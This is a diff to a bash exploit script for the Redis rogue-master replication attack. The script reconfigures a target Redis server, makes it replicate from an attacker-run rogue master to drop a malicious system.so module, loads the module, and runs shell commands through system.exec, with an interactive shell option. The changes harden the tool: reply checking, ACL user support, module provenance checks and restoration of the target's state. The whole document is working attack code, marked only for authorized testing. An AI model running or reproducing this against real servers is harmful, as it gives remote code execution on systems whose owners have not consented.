@@ -29,8 +29,10 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 # ---------- args ----------
 TARGET=""
 PASS=""
+USERNAME=""
 CMD="id; uname -a; hostname"
-MODULE="$SCRIPT_DIR/module/system.so"
+BUNDLED_MODULE="$SCRIPT_DIR/module/system.so"
+MODULE="$BUNDLED_MODULE"
 REMOTE_DIR="/tmp"
 REMOTE_NAME="exp_$RANDOM.so"
 LOCAL_IP=""       # auto-detect if blank
@@ -40,10 +42,12 @@ INTERACTIVE=0
 LEAVE_SO=0
 EXPLOIT=0
 
+# shellcheck disable=SC2034  # PASS/USERNAME are consumed by the sourced Redis helpers
 while [ $# -gt 0 ]; do
     case "$1" in
         --target)      TARGET="$2"; shift 2 ;;
         --pass|-p)     PASS="$2"; shift 2 ;;
+        --user|--username) USERNAME="$2"; shift 2 ;;
         --cmd|-c)      CMD="$2"; shift 2 ;;
         --module|-m)   MODULE="$2"; shift 2 ;;
         --remote-dir)  REMOTE_DIR="$2"; shift 2 ;;
@@ -68,6 +72,7 @@ Required:
 Common:
   --cmd 'cmd'          shell to run via system.exec (default: $CMD)
   --pass PASSWORD      AUTH password
+  --user USERNAME      Redis 6+ named ACL user (used with --pass)
   --interactive        drop into a system.exec REPL after MODULE LOAD
 
 Module:
@@ -103,10 +108,17 @@ if [ "$EXPLOIT" != 1 ]; then
     log "  as the redis-server user. Authorized testing only."
     exit 0
 fi
+if [ "$MODULE" = "$BUNDLED_MODULE" ]; then
+    command -v python3 >/dev/null 2>&1 || { err "missing provenance prerequisite: python3"; exit 1; }
+    python3 "$SCRIPT_DIR/module/verify_source.py" >/dev/null || {
+        err "bundled module source provenance verification failed"; exit 1;
+    }
+fi
 if [ ! -f "$MODULE" ]; then
-    # Prebuilt .so should be checked in. If it's missing, try to build it (offline-safe
-    # if module/redismodule.h is also checked in).
-    err "module not built: $MODULE — attempting offline build"
+    err "module not built: $MODULE — a local compiler build is required"
+    command -v make >/dev/null 2>&1 || { err "missing build prerequisite: make"; exit 1; }
+    command -v "${CC:-cc}" >/dev/null 2>&1 || { err "missing build prerequisite: ${CC:-cc}"; exit 1; }
+    err "building from vendored, checksummed source (see module/SOURCE.json)"
     if ! ( cd "$SCRIPT_DIR/module" && make >/dev/null 2>&1 ); then
         err "offline build failed. Check: $SCRIPT_DIR/module/{system.c,redismodule.h}"
         exit 1
@@ -118,23 +130,41 @@ parse_target "$TARGET"
 
 # ---------- cleanup trap ----------
 SAVED_DIR=""; SAVED_DBFILE=""; SAVED_AOF=""
+SAVED_ROLE=""; SAVED_MASTER_HOST=""; SAVED_MASTER_PORT=""
 ROGUE_PID=""
 LOADED=0
 on_exit() {
-    local rc=$?
+    local rc=$? unload_out
+    local cleanup_failed=0
     if [ "$LOADED" = 1 ]; then
         log "MODULE UNLOAD system"
-        rcmd MODULE UNLOAD system >/dev/null 2>&1 || true
+        if ! unload_out=$(rcmd MODULE UNLOAD system 2>&1); then
+            err "MODULE UNLOAD cleanup command failed: ${unload_out:-no response}"
+            cleanup_failed=1
+        elif ! redis_reply_is_ok "$unload_out"; then
+            err "MODULE UNLOAD cleanup was not acknowledged: ${unload_out:-no response}"
+            cleanup_failed=1
+        fi
     fi
     if [ "$LEAVE_SO" = 0 ] && [ "$LOADED" = 1 ]; then
         # Try to remove the dropped .so via the now-unloaded module — only works
         # if a separate sysexec primitive is still available. Skip on best-effort.
         :
     fi
-    [ -n "$SAVED_DIR" ] && { log "Restoring config"; restore_config; }
-    rcmd REPLICAOF NO ONE >/dev/null 2>&1 || true
+    if [ -n "$SAVED_ROLE" ]; then
+        log "Restoring exact config and replication state"
+        restore_config || cleanup_failed=1
+        restore_replication_state || cleanup_failed=1
+    fi
     if [ -n "$ROGUE_PID" ] && kill -0 "$ROGUE_PID" 2>/dev/null; then
         kill "$ROGUE_PID" 2>/dev/null || true
+    fi
+    trap - EXIT INT TERM
+    if [ "$cleanup_failed" = 1 ]; then
+        err "Redis restoration verification failed"
+        # An unproved cleanup/restoration state is more actionable than the
+        # main-path status and therefore always dominates it.
+        rc=77
     fi
     exit "$rc"
 }
@@ -148,15 +178,17 @@ fi
 hit "Target: $HOST:$PORT (v${REDIS_VERSION:-?}, authed=$AUTHED)"
 
 # Sanity: module load capability
-ml_out=$(rcmd MODULE LIST 2>&1)
-if echo "$ml_out" | grep -qiE 'disabled|forbidden|not allowed'; then
-    err "MODULE commands appear disabled on this target: $ml_out"
-    err "Consider enable-module-command=yes in target config (Redis 7.0+ default disables)"
+probe_module_load_capability
+if [ "$MODULE_LOAD_STATE" != "allowed" ]; then
+    err "MODULE LOAD capability is $MODULE_LOAD_STATE: $MODULE_LOAD_REASON"
     exit 4
 fi
 
-save_config
-log "Saved config — dir='$SAVED_DIR' dbfilename='$SAVED_DBFILE' appendonly='$SAVED_AOF'"
+if ! save_config; then
+    err "cannot read complete persistence/replication/auth state; refusing mutation"
+    exit 10
+fi
+log "Saved config — dir='$SAVED_DIR' dbfilename='$SAVED_DBFILE' appendonly='$SAVED_AOF' role='$SAVED_ROLE' upstream='${SAVED_MASTER_HOST:-}:${SAVED_MASTER_PORT:-}'"
 
 # ---------- direct mode ----------
 if [ "$MODE" = "direct" ]; then
@@ -191,14 +223,27 @@ fi
 
 # Stage the victim
 log "CONFIG SET dir=$REMOTE_DIR dbfilename=$REMOTE_NAME appendonly=no"
-rcmd CONFIG SET dir "$REMOTE_DIR" >/dev/null
-rcmd CONFIG SET dbfilename "$REMOTE_NAME" >/dev/null
-rcmd CONFIG SET appendonly no >/dev/null
-[ -n "$PASS" ] && rcmd CONFIG SET masterauth "$PASS" >/dev/null   # in case master auth check kicks in
+if ! config_out=$(rcmd CONFIG SET dir "$REMOTE_DIR" 2>&1); then
+    err "CONFIG SET dir staging command failed: ${config_out:-no response}"; exit 8
+fi
+redis_reply_is_ok "$config_out" || { err "CONFIG SET dir staging failed: ${config_out:-no response}"; exit 8; }
+if ! config_out=$(rcmd CONFIG SET dbfilename "$REMOTE_NAME" 2>&1); then
+    err "CONFIG SET dbfilename staging command failed: ${config_out:-no response}"; exit 8
+fi
+redis_reply_is_ok "$config_out" || { err "CONFIG SET dbfilename staging failed: ${config_out:-no response}"; exit 8; }
+if ! config_out=$(rcmd CONFIG SET appendonly no 2>&1); then
+    err "CONFIG SET appendonly staging command failed: ${config_out:-no response}"; exit 8
+fi
+redis_reply_is_ok "$config_out" || { err "CONFIG SET appendonly staging failed: ${config_out:-no response}"; exit 8; }
+# The bundled rogue master accepts the target's existing replication AUTH. Do
+# not rewrite masterauth/masteruser merely to stage the transfer.
 
 # Trigger replication
 log "REPLICAOF $LOCAL_IP $ROGUE_PORT"
-rcmd REPLICAOF "$LOCAL_IP" "$ROGUE_PORT" >/dev/null
+if ! replica_out=$(rcmd REPLICAOF "$LOCAL_IP" "$ROGUE_PORT" 2>&1); then
+    err "REPLICAOF staging command failed: ${replica_out:-no response}"; exit 8
+fi
+redis_reply_is_ok "$replica_out" || { err "REPLICAOF staging failed: $replica_out"; exit 8; }
 
 # Wait for rogue to log "Sent N bytes payload"
 for _ in $(seq 1 20); do
@@ -214,12 +259,18 @@ hit "Payload delivered to $HOST:$REMOTE_DIR/$REMOTE_NAME"
 
 # Stop being a replica
 log "REPLICAOF NO ONE"
-rcmd REPLICAOF NO ONE >/dev/null
+if ! replica_out=$(rcmd REPLICAOF NO ONE 2>&1); then
+    err "REPLICAOF NO ONE staging command failed: ${replica_out:-no response}"; exit 8
+fi
+redis_reply_is_ok "$replica_out" || { err "REPLICAOF NO ONE staging failed: ${replica_out:-no response}"; exit 8; }
 
 # Load module
 log "MODULE LOAD $REMOTE_DIR/$REMOTE_NAME"
-load_out=$(rcmd MODULE LOAD "$REMOTE_DIR/$REMOTE_NAME" 2>&1)
-if echo "$load_out" | grep -qi 'OK'; then
+if ! load_out=$(rcmd MODULE LOAD "$REMOTE_DIR/$REMOTE_NAME" 2>&1); then
+    err "MODULE LOAD command failed: ${load_out:-no response}"
+    exit 9
+fi
+if redis_reply_is_ok "$load_out"; then
     LOADED=1
     hit "MODULE LOAD success"
 else
